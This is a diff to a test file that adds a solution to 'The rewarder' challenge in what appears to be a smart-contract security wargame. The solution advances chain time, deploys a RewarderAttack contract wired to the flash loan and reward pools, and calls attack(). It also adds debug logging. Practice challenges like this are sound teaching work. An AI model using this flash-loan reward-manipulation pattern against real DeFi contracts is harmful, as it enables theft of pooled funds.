@@ -66,11 +66,18 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 25 * 60 * 60]); // 5 days
+        const RewarderAttackFactory= await ethers.getContractFactory('RewarderAttack', attacker);
+        const exploit = await RewarderAttackFactory.deploy(this.rewarderPool.address,this.flashLoanPool.address,attacker.address,this.liquidityToken.address,this.rewardToken.address);
+
+        await exploit.attack();
+    
+        console.log((await this.rewardToken.totalSupply()).toString());
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Only one round should have taken place
         expect(
             await this.rewarderPool.roundNumber()
@@ -83,6 +90,7 @@ describe('[Challenge] The rewarder', function () {
             
             // The difference between current and previous rewards balance should be lower than 0.01 tokens
             let delta = rewards.sub(ethers.utils.parseEther('25'));
+            console.log('here')
             expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
         }
         
@@ -90,11 +98,13 @@ describe('[Challenge] The rewarder', function () {
         expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
         let rewards = await this.rewardToken.balanceOf(attacker.address);
 
-        // The amount of rewards earned should be really close to 100 tokens
-        let delta = ethers.utils.parseEther('100').sub(rewards);
-        expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));
-
+        
         // Attacker finishes with zero DVT tokens in balance
         expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
+        
+        // The amount of rewards earned should be really close to 100 tokens
+        let delta = ethers.utils.parseEther('100').sub(rewards);
+            console.log('here2')
+        expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));
     });
 });
